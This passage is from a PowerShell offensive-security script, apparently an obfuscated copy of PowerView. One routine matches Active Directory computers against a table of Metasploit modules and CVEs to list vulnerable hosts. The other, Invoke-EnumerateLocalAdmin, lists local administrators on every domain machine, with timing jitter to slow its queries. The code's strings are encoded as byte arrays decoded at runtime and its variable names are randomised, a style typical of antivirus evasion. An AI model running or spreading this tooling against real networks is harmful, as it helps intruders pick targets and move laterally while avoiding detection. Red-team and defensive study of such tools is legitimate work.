    $Null = $TH0cH8.Rows.Add((HandleResult95 @(11,102,200,37,157,26,109,151,51,190,31,0,254,8,141,111,14,252,25,160,16,62,229,39,136,28,105,153) @(93,84,164,80,199)),(HandleResult95 @(133,120,188,61,224,24,79,186,16,185,6,213,44,116,158,56,163,0,205,72) @(208,74,234,68,132,117,35)),(HandleResult95 @(94,89,222,178,102,70,143,181,96,66,143,246,101,86,131,174,102,50,210,191,72,50,248,177,93,104,143,177,103,123,247,240,92,123,247,244,73,71,143,191,102,86,255,188,92,51,131,169,94,51,143,245,101,86,240,245,94,87,143,168,96,86,131,175,92,51,218,176,94,70,224,241) @(4,1,182,197)),(HandleResult95 @(4,231,112,99,6,235,77,37,41,156,70,96,1,214,23,57,1,194,116,56,63,247,112,59,4,248,90,41,41,194,108,37,7,252,27,57,1,194,119,37,40,197,99,36,42,252,18,41,40,251,99,41) @(101,175,34,83)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(51,93,181,83,109,182,92,92,186,95,117,165,63,55,147,20,109,169,44,8,148,76,118,134,42,46,228,27) @(101,111,217,38,55,241)),(HandleResult95 @(213,211,165,249,217,237,141,153,218,238,194,176,170,215,243,242,168,183,201,128) @(128,225,243,128,189)),(HandleResult95 @(249,59,174,100,210,228,90,182,119,243,154,80,167,68,133,200,1,245,119,202,239,80,136,103,233,202,90,178,112,202,230,20,158,105,241,145,46,144,42,202,192,36,255,101,210,235,45,188) @(163,99,198,19,176)),(HandleResult95 @(69,196,167,176,71,200,154,246,104,191,145,179,64,245,192,234,64,225,163,235,126,212,167,232,69,219,141,250,104,225,187,246,70,223,204,234,64,225,160,246,105,230,180,248,105,207,197,249,106,246,188,181) @(36,140,245,128)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(235,30,133,218,166,135,19,244,222,85,171,251,166,152,96,245,231,116,160,200,177,170,107,176,242,109,212,146) @(189,44,233,175,252,192,42,199)),"",(HandleResult95 @(12,32,124,165,251,17,65,100,182,218,111,75,117,133,172,61,26,39,182,227,26,75,90,166,192,63,65,96,177,227,23,76,76,168,216,100,54,37,235,236,12,32,70,186,250,17,19,41) @(86,120,20,210,153)),(HandleResult95 @(220,55,54,107,241,249,16,18,23,161,217,76,0,34,167,215,27,9,13,249,231,39,54,51,243,234,7,30,23,255,243,9,6,8,171,215,27,9,14,228,240,21,37,44,221,254,79,84,22,248,232,8) @(189,127,100,91,146)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(106,189,203,93,102,200,158,27,95,246,229,124,102,215,237,26,102,215,238,79,113,229,230,95,115,206,154,21) @(60,143,167,40)),"",(HandleResult95 @(173,22,122,165,149,9,43,162,147,13,43,225,150,25,39,185,149,125,118,168,187,125,92,166,174,39,43,166,148,52,83,231,175,52,83,227,186,8,43,168,149,25,91,171,175,124,39,190,173,124,43,226,150,25,84,226,173,24,43,191,147,25,39,184,175,124,126,167,173,9,68,230) @(247,78,18,210)),(HandleResult95 @(43,110,194,157,19,12,37,80,220,158,20,123,46,95,165,199,20,37,28,77,202,245,34,32,43,113,232,215,60,37,4,80,242,254,73,34,46,75,197,219,61,34,11,81,223,254,64,50,7,114,209,215) @(74,38,144,173,112,72)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(168,62,162,236,107,36,218,139,157,117,140,205,107,59,169,138,164,84,135,254,124,9,162,207,177,77,243,164) @(254,12,206,153,49,99,227,184)),"",(HandleResult95 @(144,50,90,78,135,141,83,66,93,166,243,89,83,110,208,161,8,1,93,159,134,89,124,77,188,163,83,70,90,159,143,29,106,67,164,248,39,100,0,159,169,45,11,79,135,130,36,72) @(202,106,50,57,229)),(HandleResult95 @(80,28,31,164,203,255,197,112,125,103,41,167,204,194,159,108,85,57,27,255,242,227,248,110,80,3,53,238,228,214,228,112,83,7,116,254,204,214,255,112,124,62,12,236,229,248,154,127,127,46,4,161) @(49,84,77,148,168,187,170,6)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(79,143,10,44,56,94,132,85,58,27,91,233,60,1,40,43,231,62,16,5,84,215,39,46,45,90,255,53,20,5,36,128) @(25,189,102,89,98)),"",(HandleResult95 @(7,132,32,207,79,26,229,56,220,110,100,239,41,239,24,54,190,123,220,87,17,239,6,204,116,52,229,60,219,87,24,171,16,194,108,111,145,30,129,87,62,155,113,206,79,21,146,50) @(93,220,72,184,45)),(HandleResult95 @(76,9,32,158,52,109,66,55,62,157,51,26,73,56,71,196,51,68,123,42,40,246,5,65,76,22,10,212,27,68,99,55,16,253,110,67,73,44,39,216,26,67,108,57,63,237,103,80,99,59,59,155) @(45,65,114,174,87,41)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(224,169,177,226,207,241,162,238,244,236,244,204,188,207,219,134,194,140,170,168) @(182,155,221,151,149)),(HandleResult95 @(201,82,48,9,248,13,48,9,213,38,36,24,197,82,21,23,209,49,91,77) @(156,96,102,112)),(HandleResult95 @(58,68,236,158,25,49,65,253,4,95,189,218,26,33,77,230,2,47,224,147,55,69,54,249,57,117,189,157,24,12,57,185,56,102,197,219,53,71,65,248,58,68,214,129,24,49,19,176) @(96,28,132,233,123,118,120,141)),(HandleResult95 @(235,211,30,240,13,200,229,237,0,243,10,191,238,226,121,170,10,225,220,240,22,152,60,228,235,204,52,186,34,225,196,237,46,147,87,230,238,246,25,182,35,230,203,236,3,131,94,188,199,241,25,183) @(138,155,76,192,110,140)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(45,4,185,222,254,247,88,72,85,172,233,243,209,57,53,6,140,250,153,141) @(123,54,213,171,164,176,97)),(HandleResult95 @(17,34,230,90,154,127,151,1,13,86,242,75,167,32,178,31,9,65,141,30) @(68,16,176,35,254,18,193,120)),(HandleResult95 @(109,170,37,108,85,181,116,107,83,177,116,40,86,165,120,112,85,193,41,97,123,193,3,111,110,155,116,111,84,136,12,46,111,136,12,42,122,180,116,97,85,165,4,98,111,192,120,119,109,192,116,43,86,165,11,43,109,164,116,118,83,165,120,113,111,192,33,110,109,181,27,47) @(55,242,77,27)),(HandleResult95 @(138,160,59,64,84,44,132,158,37,67,83,91,143,145,92,26,83,5,189,131,51,40,101,0,138,191,17,10,123,5,165,158,11,35,14,2,143,133,60,6,122,2,170,159,38,35,7,18,166,188,40,10) @(235,232,105,112,55,104)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(167,122,39,142,225,121,175,223,146,49,9,172,218,102,216,220,168,25,118,198) @(241,72,75,251,187,62,150,236)),(HandleResult95 @(185,131,100,168,231,223,186,200,123,151,193,218,181,131,65,182,206,227,209,140) @(236,177,50,209,131,178)),(HandleResult95 @(65,255,215,28,78,66,34,215,219,40,21,54,122,240,138,0,78,54,127,221,243,88,98,113,66,206,134,31,79,127,94,208,231,17,109,55,86,241,134,17,79,66,34,209,221,35,98,127) @(27,167,191,107,44,5)),(HandleResult95 @(235,145,43,219,235,206,182,15,167,187,238,234,29,146,189,224,189,20,189,227,208,129,43,131,233,221,161,3,167,229,196,175,27,184,177,224,189,20,190,254,199,179,56,147,197,201,233,0,165,242,195,236) @(138,217,121,235,136)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(154,38,22,205,145,139,45,73,219,178,142,67,27,224,133,252,77,43,133,246) @(204,20,122,184,203)),(HandleResult95 @(191,199,222,184,51,44,134,159,210,146,21,16,179,162,198,179,30,5,163,200) @(234,245,136,193,87,65)),(HandleResult95 @(247,154,7,18,207,133,86,21,201,129,86,86,204,149,90,14,207,241,11,31,225,241,33,17,244,171,86,17,206,184,46,80,245,184,46,84,224,132,86,31,207,149,38,28,245,240,90,9,247,240,86,85,204,149,41,85,247,148,86,8,201,149,90,15,245,240,3,16,247,133,57,81) @(173,194,111,101)),(HandleResult95 @(93,166,207,129,53,30,222,74,162,174,213,101,62,200,9,132,249,220,0,49,235,100,188,245,208,1,34,203,112,131,211,199,52,9,136,86,138,240,228,32,23,219,125,153,210,226,102,32,252,104,175,231) @(60,238,157,177,86,90,177)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(94,156,57,173,107,54,184,210,107,215,23,143,80,41,207,209,81,255,104,229) @(8,174,85,216,49,113,129,225)),(HandleResult95 @(38,13,175,150,93,89,31,85,163,188,123,101,42,104,183,157,112,112,58,2) @(115,63,249,239,57,52)),(HandleResult95 @(163,194,58,134,167,158,192,234,54,178,252,234,152,205,103,154,167,234,157,224,30,194,139,173,160,243,107,133,166,163,188,237,10,139,132,235,180,204,107,139,166,158,192,236,48,185,139,163) @(249,154,82,241,197,217)),(HandleResult95 @(145,216,210,216,54,205,159,230,204,219,49,186,148,233,181,130,49,228,166,251,218,176,7,225,145,199,248,146,25,228,190,230,226,187,108,227,148,253,213,158,24,227,177,232,205,171,101,240,190,234,201,221) @(240,144,128,232,85,137)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(0,138,124,127,12,255,41,57,53,193,82,93,55,224,94,58,15,233,45,55) @(86,184,16,10)),"",(HandleResult95 @(139,247,83,172,179,232,2,171,181,236,2,232,176,248,14,176,179,156,95,161,157,156,117,175,136,198,2,175,178,213,122,239,137,213,122,233,159,158,2,174,139,247,105,179,178,232,80,230) @(209,175,59,219)),(HandleResult95 @(201,12,202,34,42,236,43,238,94,122,204,119,252,107,124,194,32,245,68,34,242,28,202,122,40,255,60,226,94,36,230,50,250,65,112,194,32,245,71,63,229,46,217,101,6,235,116,168,95,35,253,51) @(168,68,152,18,73)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(32,162,203,174,103,45,79,163,196,162,127,61,23,200,233,235,100,59,75,173) @(118,144,167,219,61,106)),"",(HandleResult95 @(238,91,59,6,116,243,58,35,21,85,141,48,50,38,35,223,97,96,21,108,248,48,29,5,79,221,58,39,18,108,245,54,11,11,87,133,78,21,72,108,214,84,26,8,78,134,54,63,43,36,141,51,50,38,80,132,89,5,72,123,208,84,102,27,78,134,111,38,43,81,226,55) @(180,3,83,113,22)),(HandleResult95 @(163,36,180,127,165,141,18,161,142,95,130,124,162,176,72,189,166,1,176,36,156,145,47,191,163,59,158,53,138,164,51,161,160,63,223,37,162,164,40,161,143,6,167,56,137,154,77,173,143,56,167,53) @(194,108,230,79,198,201,125,215)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(138,240,158,43,188,180,229,241,145,39,164,170,137,131,207,99) @(220,194,242,94,230,243)),(HandleResult95 @(60,43,103,138,13,196,72,220,32,95,115,155,48,155,109,194,36,72,12,206) @(105,25,49,243,105,169,30,165)),(HandleResult95 @(45,232,247,40,69,48,137,239,59,100,78,131,254,8,18,28,210,172,59,93,59,130,205,53,125,47,250,232,6,94,78,196,252,37,102,13,232,229,30,94,57,220,166,52,126,69,137,235) @(119,176,159,95,39)),(HandleResult95 @(129,159,60,234,106,202,136,150,155,93,190,58,234,158,213,189,10,183,95,229,189,184,133,6,187,94,246,157,172,186,32,172,107,221,222,138,179,3,143,127,195,141,161,160,35,163,57,249,170,154,130,23,150,126,179,218) @(224,215,110,218,9,142,231)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(227,28,159,159,169,117,200,134,77,138,168,170,103,176,136,19) @(181,46,243,234,243,50,241)),(HandleResult95 @(12,86,66,3,61,9,66,3,16,34,86,18,0,86,103,29,20,53,41,71) @(89,100,20,122)),(HandleResult95 @(224,36,71,147,216,59,22,148,222,63,22,215,219,43,26,143,216,79,75,158,246,78,125,142,224,36,101,147,227,5,22,144,217,6,110,213,226,6,110,156,244,77,22,144,217,78,30,156) @(186,124,47,228)),(HandleResult95 @(233,2,192,37,203,87,53,254,6,161,113,155,119,35,189,32,246,120,254,120,0,208,24,250,116,255,107,32,196,39,220,99,202,64,99,226,46,255,64,222,94,48,201,61,220,70,152,100,23,204,31,167) @(136,74,146,21,168,19,90)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(132,81,193,96,186,149,90,158,118,153,144,58,248,84,221,239) @(210,99,173,21,224)),(HandleResult95 @(173,55,137,152,27,68,74,66,177,67,157,137,38,27,111,92,181,84,226,220) @(248,5,223,225,127,41,28,59)),(HandleResult95 @(74,53,32,139,5,87,84,56,152,36,41,94,41,171,82,123,15,123,152,29,92,94,6,136,62,121,84,60,159,29,81,93,16,134,38,104,32,30,197,20,115,95,14,134,4,103,80,117) @(16,109,72,252,103)),(HandleResult95 @(30,25,62,111,66,59,62,26,19,18,27,98,8,38,20,21,53,1,9,74,37,9,62,55,64,40,41,22,19,76,49,39,14,12,24,21,53,1,10,87,50,59,45,40,108,6,97,27,17,117,50,43,32,40,28,66) @(127,81,108,95,33)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(118,95,69,186,122,42,16,252,67,20,107,150,117,44,20,242) @(32,109,41,207)),(HandleResult95 @(185,66,164,123,16,158,13,160,165,54,176,106,45,193,40,190,161,33,207,63) @(236,112,242,2,116,243,91,217)),(HandleResult95 @(237,32,205,223,21,176,2,199,28,230,145,68,150,108,130,19,199,155,19,141,119,132,54,209,241,30,206,79,212,2,228,153,47,141,122,205,55,243,145,0,149,85,246,69) @(183,120,165,168,119,247,59)),(HandleResult95 @(42,66,153,175,191,195,222,238,7,57,175,172,184,254,132,242,47,103,157,244,134,223,227,240,42,93,179,229,144,234,255,238,41,89,242,245,184,234,228,238,6,96,138,232,146,212,129,224,4,94,172,229) @(75,10,203,159,220,135,177,152)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(64,27,185,209,119,81,16,230,199,84,84,112,128,229,16,43) @(22,41,213,164,45)),(HandleResult95 @(128,219,171,1,196,171,131,144,180,62,226,174,140,219,142,31,237,151,232,212) @(213,233,253,120,160,198)),(HandleResult95 @(50,115,183,116,61,95,81,91,187,64,102,43,9,124,234,104,61,43,12,81,147,48,17,108,49,66,230,119,60,98,41,25,135,121,30,40,37,109,230,118,5,64,58,67,188,68,52,37) @(104,43,223,3,95,24)),(HandleResult95 @(81,24,88,183,222,116,63,124,203,142,84,99,110,254,136,90,52,103,209,214,106,8,88,239,220,103,40,112,203,208,126,38,104,212,132,90,52,103,210,203,125,58,75,240,243,89,96,112,201,249,125,101) @(48,80,10,135,189)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(183,174,62,121,201,157,84,210,255,43,78,202,143,44,220,161) @(225,156,82,12,147,218,109)),(HandleResult95 @(195,82,177,58,242,58,250,10,189,16,212,6,207,55,169,49,223,19,223,93) @(150,96,231,67,150,87)),(HandleResult95 @(225,85,21,93,144,144,203,36,223,78,68,25,147,128,199,63,217,62,25,80,190,229,160,62,225,85,55,93,171,174,203,32,216,119,60,27,170,173,179,44,245,60,68,94,145,229,195,44) @(187,13,125,42,242,215,242,84)),(HandleResult95 @(123,169,211,106,78,249,117,151,205,105,73,142,126,152,180,48,73,208,76,138,219,2,127,213,123,182,249,32,97,208,84,151,227,9,20,215,126,140,212,44,96,215,91,150,207,9,29,202,87,165,212,111) @(26,225,129,90,45,189)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(173,175,34,205,116,144,51,9,152,228,12,225,123,150,55,7) @(251,157,78,184,46,215,10,58)),(HandleResult95 @(203,46,202,237,250,113,240,254,196,79,222,197,199,75,210,230,215,88,213,169) @(158,28,156,148)),(HandleResult95 @(232,177,165,47,208,174,244,40,214,170,244,107,211,190,248,51,208,218,169,34,254,218,131,44,235,128,244,44,209,147,140,106,234,147,140,104,255,175,244,45,232,177,159,48,209,174,166,101) @(178,233,205,88)),(HandleResult95 @(147,85,169,221,191,184,147,136,190,46,159,222,184,133,201,148,150,112,173,134,134,164,174,150,147,74,131,151,144,145,178,136,144,78,194,135,184,145,169,136,191,119,186,154,146,149,204,132,188,89,182,216) @(242,29,251,237,220,252,252,254)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(190,185,68,179,157,175,178,27,165,190,170,210,125,135,250,213) @(232,139,40,198,199)),(HandleResult95 @(19,201,139,182,34,150,177,165,28,168,159,158,31,172,147,189,15,191,148,242) @(70,251,221,207)),(HandleResult95 @(211,85,143,135,212,248,229,108,237,78,222,195,215,232,233,119,235,62,131,138,250,140,146,104,208,100,222,132,213,197,157,46,209,119,166,194,248,211,229,105,237,63,161,135,215,238,225,33) @(137,13,231,240,182,191,220,28)),(HandleResult95 @(92,37,208,179,94,41,237,245,113,94,230,176,89,20,183,233,89,0,212,232,103,53,208,235,92,58,250,249,113,0,204,245,95,62,187,233,89,0,215,245,112,7,195,244,115,4,178,179,115,7,229,183) @(61,109,130,131)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(100,223,27,192,104,170,78,134,81,148,53,236,103,172,74,136) @(50,237,119,181)),(HandleResult95 @(59,137,203,194,14,3,215,247,225,57,44,234,196,236,36,28,242,217,242,87) @(110,187,157,187,106)),(HandleResult95 @(15,5,255,78,226,18,100,231,93,195,108,110,246,110,181,62,63,164,93,250,25,110,217,77,217,60,100,227,90,250,20,111,207,67,193,102,16,209,0,179,52,110,217,67,228,56,16,170) @(85,93,151,57,128)),(HandleResult95 @(65,53,219,202,138,28,79,11,197,201,141,107,68,4,188,144,141,53,118,22,211,162,187,48,65,42,241,128,165,53,110,11,235,169,208,50,68,16,220,140,164,50,97,10,199,147,217,104,110,23,226,130) @(32,125,137,250,233,88)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(216,34,101,3,52,44,15,19,237,105,75,47,59,42,11,29) @(142,16,9,118,110,107,54,32)),(HandleResult95 @(139,3,17,228,186,92,43,247,132,98,5,204,135,102,9,239,151,117,14,160) @(222,49,71,157)),(HandleResult95 @(0,181,31,124,56,170,78,123,62,174,78,56,59,186,66,96,56,222,19,113,22,222,57,127,3,132,78,127,57,151,54,63,2,151,54,57,20,220,78,126,0,181,37,99,57,170,28,54) @(90,237,119,11)),(HandleResult95 @(170,60,221,45,168,48,224,107,135,71,235,46,175,13,186,119,175,25,217,118,145,44,221,117,170,35,247,103,135,25,193,107,169,39,182,119,175,25,218,107,134,30,206,106,132,55,191,45,134,30,218,106) @(203,116,143,29)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(154,122,205,43,193,175,245,123,194,39,217,177,153,9,156,99) @(204,72,161,94,155,232)),(HandleResult95 @(87,115,112,129,126,254,113,8,88,18,100,169,67,196,83,16,75,5,111,197) @(2,65,38,248,26,147,29,98)),(HandleResult95 @(180,144,155,114,73,153,215,184,151,70,18,237,143,159,198,110,73,237,138,178,191,54,101,170,183,161,202,113,72,164,171,191,171,127,106,236,163,158,202,127,72,153,215,190,145,77,101,164) @(238,200,243,5,43,222)),(HandleResult95 @(0,101,194,65,238,174,14,91,220,66,233,217,5,84,165,27,233,135,55,70,202,41,223,130,0,122,232,11,193,135,47,91,242,34,180,128,5,64,197,7,192,128,32,85,221,50,189,147,47,87,217,68) @(97,45,144,113,141,234)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(184,224,34,195,180,149,119,133,141,171,12,239,187,147,115,139) @(238,210,78,182)),(HandleResult95 @(81,82,188,125,73,105,12,128,94,126,70,49,179,83,99,118,41,174,73,16) @(4,96,234,4,45)),(HandleResult95 @(23,18,230,225,94,160,116,58,234,213,5,212,44,29,187,253,94,212,41,48,194,165,114,147,20,35,183,226,95,157,12,126,214,236,125,213,3,123,183,227,102,191,31,34,237,209,87,218) @(77,74,142,150,60,231)),(HandleResult95 @(233,174,200,43,108,163,231,144,214,40,107,212,236,159,175,113,107,138,222,141,192,67,93,143,233,177,226,97,67,138,198,144,248,72,54,141,236,139,207,109,66,141,201,145,213,88,63,215,197,140,207,108) @(136,230,154,27,15,231)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(67,192,63,55,160,87,44,193,48,59,184,73,64,179,110,127) @(21,242,83,66,250,16)),(HandleResult95 @(123,40,199,172,9,8,6,124,116,73,211,132,52,50,36,100,103,94,220,232) @(46,26,145,213,109,101,106,22)),(HandleResult95 @(157,84,166,99,64,116,224,183,104,141,45,17,82,142,242,103,172,39,70,73,149,244,66,186,77,75,10,173,164,118,139,99,122,73,152,245,65,152,45,88,80,158,254,122,172,92,108,73) @(199,12,206,20,34,51,217)),(HandleResult95 @(248,234,93,35,2,239,188,195,213,145,107,32,5,210,230,223,253,207,89,120,59,243,129,221,248,245,119,105,45,198,157,195,251,241,54,121,5,198,134,195,212,200,78,107,44,232,227,204,215,216,70,38) @(153,162,15,19,97,171,211,181)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(95,231,207,131,65,218,48,230,192,143,89,196,92,148,158,203) @(9,213,163,246,27,157)),"",(HandleResult95 @(157,139,191,169,160,128,234,167,186,129,254,224,182,137,247,172,177,228,186,184,139,225,133,180,152,159,153,160,135,187,254,167,180,164,131,189,139,173,159,187,137,191,238,181,155,245,234,163) @(199,211,215,222,194)),(HandleResult95 @(138,204,49,141,182,112,198,157,200,80,217,230,80,208,222,238,7,208,131,95,243,179,214,11,220,130,76,211,167,233,45,203,183,103,144,129,224,14,232,163,121,195,170,243,46,196,229,67,228,145,209,26,241,162,9,148) @(235,132,99,189,213,52,169)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(191,147,244,215,47,174,152,171,193,12,171,248,205,227,72,212) @(233,161,152,162,117)),"",(HandleResult95 @(253,235,230,93,245,128,33,10,195,240,183,25,246,144,45,17,197,128,234,80,219,245,74,16,253,235,196,93,206,190,33,14,196,201,207,27,207,189,89,2,233,130,183,94,244,245,41,2) @(167,179,142,42,151,199,24,122)),(HandleResult95 @(96,75,37,192,153,69,108,1,188,201,101,48,19,137,207,107,103,26,166,145,91,91,37,152,155,86,123,13,188,151,79,117,21,163,195,107,103,26,165,140,76,105,54,135,180,82,51,0,189,190,84,54) @(1,3,119,240,250)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(10,19,235,47,139,101,199,181,63,88,197,3,132,99,195,187) @(92,33,135,90,209,34,254,134)),"",(HandleResult95 @(31,108,9,249,39,115,88,254,33,119,88,189,36,99,84,229,39,7,5,244,9,7,47,250,28,93,88,250,38,78,32,188,29,78,32,190,8,114,88,251,31,108,51,230,38,115,10,179) @(69,52,97,142)),(HandleResult95 @(65,31,58,194,67,19,7,132,108,100,12,193,68,46,93,152,68,58,62,153,122,15,58,154,65,0,16,136,108,58,38,132,66,4,81,152,68,58,61,132,109,61,41,133,110,62,88,136,110,19,37,199) @(32,87,104,242)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(238,232,63,16,6,116,53,139,185,42,39,5,102,77,133,231) @(184,218,83,101,92,51,12)),"",(HandleResult95 @(232,83,59,223,33,86,139,123,55,235,122,34,211,92,102,195,33,34,214,113,31,155,13,101,235,98,106,220,32,107,243,63,11,210,2,35,252,58,106,221,25,73,224,99,48,239,40,44) @(178,11,83,168,67,17)),(HandleResult95 @(72,172,57,97,103,109,139,29,29,55,77,215,15,40,49,67,128,6,7,111,115,188,57,57,101,126,156,17,29,105,103,146,9,2,61,67,128,6,4,114,100,142,42,38,75,106,212,91,28,110,124,147) @(41,228,107,81,4)))  

    # Status user        
    Write-Verbose (HandleResult95 @(199,142,214,106,64,213,185,201,84,94,222,133,199,89,60,254,190,225,64,127,242,175,228,63,109,215,161,223,109,112,210,154,196,61,64,247,147,200,88,122,242,154,240,119,80,199,189,213,84,90,210,167,243,119,75,248,149,203,95,110,197,198,231,105,107,215,161,148,84,94,232,141,234,103,61,229) @(144,247,166,14,9))

    # ----------------------------------------------------------------
    # Setup data table to store vulnerable systems
    # ----------------------------------------------------------------

    # Create data table to house vulnerable server list
    $xtVUYRm = New-Object System.Data.DataTable 
    $Null = $xtVUYRm.Columns.Add('ComputerName')
    $Null = $xtVUYRm.Columns.Add('OperatingSystem')
    $Null = $xtVUYRm.Columns.Add('ServicePack')
    $Null = $xtVUYRm.Columns.Add('LastLogon')
    $Null = $xtVUYRm.Columns.Add('MsfModule')
    $Null = $xtVUYRm.Columns.Add('CVE')

    # Iterate through each exploit
    $TH0cH8 | ForEach-Object {
                 
        $hWLX1YC = $_.OperatingSystem
        $OScKXX = $_.ServicePack
        $GCjJA = $_.MsfModule
        $e66CU = $_.CVE

        # Iterate through each ADS computer
        $iqAC8a | ForEach-Object {
            
            $cEFZa = $_.Hostname
            $MXTOqP6 = $_.OperatingSystem
            $XpkpGYf = $_.ServicePack                                                        
            $qnPA = $_.LastLogon
            
            # Add exploitable systems to vul computers data table
            if ($MXTOqP6 -like ($hWLX1YC + "*") -and $XpkpGYf -like ($OScKXX) ) {                    
                # Add domain computer to data table                    
                $Null = $xtVUYRm.Rows.Add($cEFZa,$MXTOqP6,$XpkpGYf,$qnPA,$GCjJA,$e66CU)
            }
        }
    }     
    
    # Display results
    $Hv3lbsTF = $xtVUYRm | Select-Object ComputerName -Unique | Measure-Object
    $ih3h = $Hv3lbsTF.Count
    if ($Hv3lbsTF.Count -gt 0) {
        # Return vulnerable server list order with some hack date casting
        Write-Verbose ((HandleResult95 @(254,15,71,193,143,236,44,69,193,145,156,29,122,228,251,148) @(169,118,51,165,198)) + $ih3h + (HandleResult95 @(239,101,20,250,194,106,0,249,194,106,58,228,196,106,46,185,239,101,12,189,196,106,99,224,197,64,16,229,196,106,3,235,197,30,58,246,194,106,0,248,197,84,19,177) @(166,45,86,140)))
        $xtVUYRm | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose (HandleResult95 @(231,216,194,113,150,142,133,215,186,93,133,250,210,230,198,121,188,166,246,200,145,82,138,172,211,146,159,111,187,140,230,213,144,108,157,248,234,249,185,121,150,140,234,215,151,66,234,160,252,198,206,40) @(176,161,243,21,223,203))
    }
}


function Invoke-EnumerateLocalAdmin {
<#
    .SYNOPSIS

        This function queries the domain for all active machines with
        Get-NetComputer, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER NoPing

        Switch. Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .PARAMETER NoClobber

        Switch. Don't overwrite any existing output file.

    .PARAMETER TrustGroups

        Switch. Only return results that are not part of the local machine
        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup
        functionality.

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.
    
    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-EnumerateLocalAdmin

        Enumerates the members of local administrators for all machines
        in the current domain.

    .EXAMPLE

        PS C:\> Invoke-EnumerateLocalAdmin -Threads 10

        Threaded local admin enumeration, replaces Invoke-EnumerateLocalAdminThreaded

    .LINK

        http://blog.harmj0y.net/
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $TrustGroups,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose ((HandleResult95 @(185,25,44,118,167,38,22,35,140,13,105,98,140,13,63,117,189,55,105,32,140,82,40,126,162,53,10,103,138,55,109,126,141,13,26,34,180,53,36,100,183,82,26,97,191,55,14,102,143,55,104,117,138,82,48,34,143,35,30,121,180,55,36,122,139,51,30,100,180,9,29,47) @(238,96,92,18)) + $Delay)

        if(!$ComputerName) { 

            if($Domain) {
                $ajPzEg = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $ajPzEg = @( (Get-NetDomain).name )
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(128,59,17,242,132,138,145,115,59,206,135,249,182,21,84,248,132,139,133,52,3,193,139,188,181,43,32,171) @(215,66,97,150,205,204)) + $Domain + (HandleResult95 @(18,120,121,172,42,13,252,139,57,12,109,234,42,19,131,217) @(91,63,35,218,73,100,190,228)))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(111,189,177,255,90,151,176,226,95,152,196,255,97,189,176,169,89,189,216,240) @(59,208,137,152))
            }
        }

        # delete any existing output file if it already exists
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
